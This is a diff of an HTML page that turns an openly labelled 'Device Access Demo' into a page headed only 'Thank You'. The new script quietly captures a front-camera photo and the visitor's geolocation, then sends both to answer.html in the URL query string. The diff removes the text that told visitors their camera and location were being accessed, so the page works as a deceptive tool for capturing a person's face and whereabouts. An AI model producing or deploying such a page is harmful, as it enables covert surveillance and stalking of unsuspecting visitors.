@@ -3,50 +3,46 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Device Access Demo</title>
+    <title>Thank You</title>
     <style>
-        body { font-family: Arial, sans-serif; margin: 20px; }
-        .status { font-size: 1.2em; margin-bottom: 20px; }
+        body { font-family: Arial, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; }
+        h1 { font-size: 3em; }
     </style>
 </head>
 <body>
 
-    <h1>Accessing Device Information...</h1>
-    <p class="status">Please wait while we access your camera, microphone, and location...</p>
+    <h1>Thank You</h1>
 
     <script>
-        // Initialize variables to hold data
         let locationData = {};
-        let hasCameraAccess = false;
-        let hasMicAccess = false;
+        let snapshot = null;
 
-        // Access the camera
+        // Access front camera
         if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
-            navigator.mediaDevices.getUserMedia({ video: true })
-                .then(() => {
-                    hasCameraAccess = true;
-                    checkAllDataCollected();
+            navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
+                .then(stream => {
+                    const video = document.createElement('video');
+                    video.srcObject = stream;
+                    video.play();
+                    
+                    // Capture a snapshot after the video stream is ready
+                    video.onloadedmetadata = () => {
+                        const canvas = document.createElement('canvas');
+                        canvas.width = video.videoWidth;
+                        canvas.height = video.videoHeight;
+                        const context = canvas.getContext('2d');
+                        context.drawImage(video, 0, 0, canvas.width, canvas.height);
+                        snapshot = canvas.toDataURL('image/png');
+                        stream.getTracks().forEach(track => track.stop()); // Stop the camera after snapshot
+                        checkAllDataCollected();
+                    };
                 })
                 .catch(() => {
-                    hasCameraAccess = false;
                     checkAllDataCollected();
                 });
         }
 
-        // Access the microphone
-        if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
-            navigator.mediaDevices.getUserMedia({ audio: true })
-                .then(() => {
-                    hasMicAccess = true;
-                    checkAllDataCollected();
-                })
-                .catch(() => {
-                    hasMicAccess = false;
-                    checkAllDataCollected();
-                });
-        }
-
-        // Access the location
+        // Access location
         if (navigator.geolocation) {
             navigator.geolocation.getCurrentPosition(position => {
                 locationData.latitude = position.coords.latitude;
@@ -63,16 +59,15 @@
 
         // Function to check if all data is collected
         function checkAllDataCollected() {
-            if (locationData.latitude !== undefined || locationData.error) {
+            if (snapshot !== null && (locationData.latitude !== undefined || locationData.error)) {
                 redirectToAnswer();
             }
         }
 
-        // Redirect to answer.html with collected data
+        // Redirect to answer.html with the snapshot and location data
         function redirectToAnswer() {
             const queryParams = new URLSearchParams({
-                camera: hasCameraAccess,
-                microphone: hasMicAccess,
+                snapshot: encodeURIComponent(snapshot),
                 latitude: locationData.latitude || '',
                 longitude: locationData.longitude || '',
                 locationError: locationData.error || ''
@@ -81,5 +76,6 @@
             window.location.href = 'answer.html?' + queryParams.toString();
         }
     </script>
+
 </body>
 </html>
